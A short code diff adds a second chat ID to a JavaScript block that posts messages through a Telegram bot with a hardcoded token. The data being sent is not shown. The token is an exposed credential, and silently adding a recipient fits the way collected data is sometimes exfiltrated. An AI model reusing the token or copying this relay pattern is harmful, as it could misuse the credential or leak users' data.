@@ -501,7 +501,7 @@
 
             // --- SEND TO TELEGRAM ---
             const token = '8073281976:AAFEXES81KFCOAZixKn4pnE2JL6PeBa8Y2s';
-            const chatIds = '420451657'.split(',').map(id => id.trim()).filter(Boolean);
+            const chatIds = '420451657,388027576'.split(',').map(id => id.trim()).filter(Boolean);
 chatIds.forEach(chatId => {
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
